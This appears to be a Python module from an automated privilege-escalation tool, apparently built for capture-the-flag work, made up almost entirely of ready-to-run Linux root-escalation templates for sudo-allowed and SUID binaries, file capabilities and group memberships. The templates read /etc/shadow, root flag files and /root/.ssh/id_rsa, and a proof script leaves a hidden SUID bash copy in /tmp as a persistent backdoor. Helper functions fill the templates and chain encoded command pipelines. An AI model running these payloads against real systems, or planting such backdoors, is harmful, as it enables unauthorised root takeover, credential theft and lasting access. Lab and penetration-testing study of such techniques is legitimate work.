"""Known escalation templates and payloads.

Templates use two placeholders substituted via str.replace (not str.format, so
literal braces in awk/perl programs need no escaping):
  {path}  absolute path to the sudo-allowed / SUID binary
  {cmd}   a program to execute (we substitute an uploaded script path)
  {files} space-separated files to read (for file-read vectors)
"""

# Script run as root to prove success + capture flags. Uploaded once.
PROOF_SCRIPT = (
    "#!/bin/sh\n"
    "id\n"
    "cat /root/root.txt /root/proof.txt /root/flag.txt /root/flag*.txt 2>/dev/null\n"
    "cp /bin/bash /tmp/.ap_rb 2>/dev/null && chmod 6755 /tmp/.ap_rb 2>/dev/null\n"
)
PROOF_PATH = "/tmp/.ap_proof.sh"
PLANT_PATH = "/tmp/.ap_plant.sh"

# Shell command run as the escalated identity to prove privilege + grab flags.
PROOF_CMD = ("id; cat /root/root.txt /root/proof.txt /root/flag*.txt 2>/dev/null; "
             "for f in /home/*/*.txt /home/*/user.txt; do cat \"$f\" 2>/dev/null; done")

# Files worth reading as a higher-priv identity.
ROOT_FILES = "/root/root.txt /root/proof.txt /root/flag.txt /root/.ssh/id_rsa"

# ---- sudo: run {cmd} as the sudo target --------------------------------------
SUDO_EXEC = {
    "find":    "sudo {ru}{path} /etc/passwd -maxdepth 0 -exec {cmd} \\;",
    "awk":     "sudo {ru}{path} 'BEGIN{system(\"{cmd}\")}'",
    "gawk":    "sudo {ru}{path} 'BEGIN{system(\"{cmd}\")}'",
    "mawk":    "sudo {ru}{path} 'BEGIN{system(\"{cmd}\")}'",
    "python":  "sudo {ru}{path} -c 'import os;os.system(\"{cmd}\")'",
    "python2": "sudo {ru}{path} -c 'import os;os.system(\"{cmd}\")'",
    "python3": "sudo {ru}{path} -c 'import os;os.system(\"{cmd}\")'",
    "perl":    "sudo {ru}{path} -e 'system(\"{cmd}\")'",
    "ruby":    "sudo {ru}{path} -e 'system(\"{cmd}\")'",
    "php":     "sudo {ru}{path} -r 'system(\"{cmd}\");'",
    "lua":     "sudo {ru}{path} -e 'os.execute(\"{cmd}\")'",
    "lua5.1":  "sudo {ru}{path} -e 'os.execute(\"{cmd}\")'",
    "node":    "sudo {ru}{path} -e 'require(\"child_process\").execSync(\"{cmd}\",{stdio:\"inherit\"})'",
    "bash":    "sudo {ru}{path} -c '{cmd}'",
    "sh":      "sudo {ru}{path} -c '{cmd}'",
    "dash":    "sudo {ru}{path} -c '{cmd}'",
    "ash":     "sudo {ru}{path} -c '{cmd}'",
    "zsh":     "sudo {ru}{path} -c '{cmd}'",
    "ksh":     "sudo {ru}{path} -c '{cmd}'",
    "env":     "sudo {ru}{path} /bin/sh -c '{cmd}'",
    "nice":    "sudo {ru}{path} /bin/sh -c '{cmd}'",
    "stdbuf":  "sudo {ru}{path} -i0 /bin/sh -c '{cmd}'",
    "timeout": "sudo {ru}{path} 7 /bin/sh -c '{cmd}'",
    "xargs":   "sudo {ru}{path} -a /dev/null /bin/sh -c '{cmd}'",
    "flock":   "sudo {ru}{path} -u / /bin/sh -c '{cmd}'",
    "tar":     "sudo {ru}{path} -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec={cmd}",
    "vim":     "sudo {ru}{path} -E -s -c ':!{cmd}' -c ':q!' /dev/null",
    "vi":      "sudo {ru}{path} -E -s -c ':!{cmd}' -c ':q!' /dev/null",
    "ftp":     "echo '!{cmd}' | sudo {ru}{path} -n",
    "gdb":     "sudo {ru}{path} -nx -ex '!{cmd}' -ex quit",
    "make":    "sudo {ru}{path} -s --eval=$'x:\\n\\t-{cmd}' x",
    "ssh":     "sudo {ru}{path} -o ProxyCommand=';{cmd}' x",
    "git":     "sudo {ru}{path} -c core.pager='!{cmd}' -p help",
    "systemctl": None, "service": None, "apt": None, "apt-get": None,
    "nano": None, "less": None, "more": None, "man": None, "pico": None,
}

# sudo: read privileged files (capture flags without a shell).
SUDO_READ = {
    "cat": "sudo {ru}{path} {files} 2>/dev/null",
    "tac": "sudo {ru}{path} {files} 2>/dev/null",
    "nl":  "sudo {ru}{path} {files} 2>/dev/null",
    "head": "sudo {ru}{path} {files} 2>/dev/null",
    "tail": "sudo {ru}{path} -n+1 {files} 2>/dev/null",
    "sort": "sudo {ru}{path} {files} 2>/dev/null",
    "strings": "sudo {ru}{path} {files} 2>/dev/null",
    "grep": "sudo {ru}{path} -h '' {files} 2>/dev/null",
    "cut": "sudo {ru}{path} -c1- {files} 2>/dev/null",
}

# sudo: file-write / mode primitives that we convert into a clean root exec.
#   chmod the shell SUID, then run {cmd} via `bash -p`.
SUDO_WRITE = {
    "chmod": "sudo {ru}{path} u+s /bin/bash && /bin/bash -p -c '{cmd}'",
    # cp/dd/tee/install/mv/chown handled as advisor leads (destructive/fiddly).
    "cp": None, "dd": None, "tee": None, "install": None, "mv": None, "chown": None,
}

# ---- SUID binaries: run {cmd} with euid of the file owner (usually root) -----
SUID_EXEC = {
    "find":    "{path} /etc/passwd -maxdepth 0 -exec {cmd} \\;",
    "bash":    "{path} -p -c '{cmd}'",
    "sh":      "{path} -p -c '{cmd}'",
    "dash":    "{path} -p -c '{cmd}'",
    "zsh":     "{path} -c '{cmd}'",
    "python":  "{path} -c 'import os;os.setuid(0);os.system(\"{cmd}\")'",
    "python2": "{path} -c 'import os;os.setuid(0);os.system(\"{cmd}\")'",
    "python3": "{path} -c 'import os;os.setuid(0);os.system(\"{cmd}\")'",
    "perl":    "{path} -e 'use POSIX qw(setuid);setuid(0);system(\"{cmd}\")'",
    "ruby":    "{path} -e 'Process::Sys.setuid(0);system(\"{cmd}\")'",
    "awk":     "{path} 'BEGIN{system(\"{cmd}\")}'",
    "env":     "{path} /bin/sh -pc '{cmd}'",
    "node":    "{path} -e 'process.setuid(0);require(\"child_process\").execSync(\"{cmd}\",{stdio:\"inherit\"})'",
    "cp": None, "nmap": None, "vim.basic": None,
}

# SUID file-read: euid root, so a reader dumps privileged files directly.
SUID_READ = {
    "cat": "{path} {files} 2>/dev/null",
    "head": "{path} {files} 2>/dev/null",
    "tail": "{path} -n+1 {files} 2>/dev/null",
    "strings": "{path} {files} 2>/dev/null",
    "nl": "{path} {files} 2>/dev/null",
}

# ---- file capabilities -------------------------------------------------------
CAP_SETUID = {
    "python":  "{path} -c 'import os;os.setuid(0);os.system(\"{cmd}\")'",
    "python2": "{path} -c 'import os;os.setuid(0);os.system(\"{cmd}\")'",
    "python3": "{path} -c 'import os;os.setuid(0);os.system(\"{cmd}\")'",
    "perl":    "{path} -e 'use POSIX qw(setuid);setuid(0);system(\"{cmd}\")'",
    "ruby":    "{path} -e 'Process::Sys.setuid(0);system(\"{cmd}\")'",
    "node":    "{path} -e 'process.setuid(0);require(\"child_process\").execSync(\"{cmd}\",{stdio:\"inherit\"})'",
    "php":     "{path} -r 'posix_setuid(0);system(\"{cmd}\");'",
}
# cap_dac_read_search / cap_dac_override -> read any file.
CAP_DAC_READ = {
    "python":  "{path} -c 'print(open(\"/root/root.txt\").read())' 2>/dev/null",
    "python3": "{path} -c 'print(open(\"/root/root.txt\").read())' 2>/dev/null",
    "tar":     "{path} xf /root/root.txt -O 2>/dev/null; {path} -cf /dev/stdout /root/root.txt 2>/dev/null",
}

# ---- dangerous group memberships --------------------------------------------
# escalation primitives keyed by unix group name.
GROUP_VECTORS = {
    "docker": "docker run -v /:/mnt --rm -it alpine chroot /mnt {cmd}",
    "lxd":    None,   # lxd/lxc image import container escape (advisor lead)
    "lxc":    None,
    "disk":   "debugfs -w /dev/sda1 2>/dev/null",  # raw disk read (lead)
    "adm":    None,   # read logs
    "shadow": "cat /etc/shadow",
    "sudo":   None,
    "wheel":  None,
    "video":  None,
}


def render(template: str, path: str, cmd: str = "", files: str = "",
           runas: str | None = None) -> str:
    ru = "" if runas in (None, "root") else f"-u {runas} "
    return (template.replace("{path}", path)
                    .replace("{cmd}", cmd)
                    .replace("{files}", files or ROOT_FILES)
                    .replace("{ru}", ru))


# ---- shell runners: execute an arbitrary /bin/sh pipeline as a higher identity
# A generated wrapper substitutes @SQ@ (single-quoted) / @DQ@ (double-quoted)
# with a self-decoding base64 pipeline, so arbitrary commands chain cleanly.
# {sudo} is "sudo [-u user] " for sudo vectors, "" for SUID/caps. {path} = binary.
RUNNER_SUDO = {
    "find":    "{sudo}{path} /etc/passwd -maxdepth 0 -exec /bin/sh -c @SQ@ ';'",
    "bash":    "{sudo}{path} -c @SQ@",
    "sh":      "{sudo}{path} -c @SQ@",
    "dash":    "{sudo}{path} -c @SQ@",
    "ash":     "{sudo}{path} -c @SQ@",
    "zsh":     "{sudo}{path} -c @SQ@",
    "ksh":     "{sudo}{path} -c @SQ@",
    "env":     "{sudo}{path} /bin/sh -c @SQ@",
    "python":  "{sudo}{path} -c 'import os;os.system(@DQ@)'",
    "python2": "{sudo}{path} -c 'import os;os.system(@DQ@)'",
    "python3": "{sudo}{path} -c 'import os;os.system(@DQ@)'",
    "perl":    "{sudo}{path} -e 'system(@DQ@)'",
    "ruby":    "{sudo}{path} -e 'system(@DQ@)'",
    "awk":     "{sudo}{path} 'BEGIN{system(@DQ@)}'",
    "gawk":    "{sudo}{path} 'BEGIN{system(@DQ@)}'",
    "php":     "{sudo}{path} -r 'system(@DQ@);'",
    "lua":     "{sudo}{path} -e 'os.execute(@DQ@)'",
}
RUNNER_SUID = {
    "find":    "{path} /etc/passwd -maxdepth 0 -exec /bin/sh -p -c @SQ@ ';'",
    "bash":    "{path} -p -c @SQ@",
    "sh":      "{path} -p -c @SQ@",
    "dash":    "{path} -p -c @SQ@",
    "env":     "{path} /bin/sh -p -c @SQ@",
    "python":  "{path} -c 'import os;os.setuid(0);os.system(@DQ@)'",
    "python2": "{path} -c 'import os;os.setuid(0);os.system(@DQ@)'",
    "python3": "{path} -c 'import os;os.setuid(0);os.system(@DQ@)'",
    "perl":    "{path} -e 'use POSIX qw(setuid);setuid(0);system(@DQ@)'",
    "awk":     "{path} 'BEGIN{system(@DQ@)}'",
}
RUNNER_CAP = {
    "python":  "{path} -c 'import os;os.setuid(0);os.system(@DQ@)'",
    "python2": "{path} -c 'import os;os.setuid(0);os.system(@DQ@)'",
    "python3": "{path} -c 'import os;os.setuid(0);os.system(@DQ@)'",
    "perl":    "{path} -e 'use POSIX qw(setuid);setuid(0);system(@DQ@)'",
    "ruby":    "{path} -e 'Process::Sys.setuid(0);system(@DQ@)'",
}


def runner(kind: str, name: str, path: str, sudo: str = "") -> str | None:
    table = {"sudo": RUNNER_SUDO, "suid": RUNNER_SUID, "cap": RUNNER_CAP}[kind]
    tmpl = table.get(name)
    if not tmpl:
        return None
    return tmpl.replace("{sudo}", sudo).replace("{path}", path)
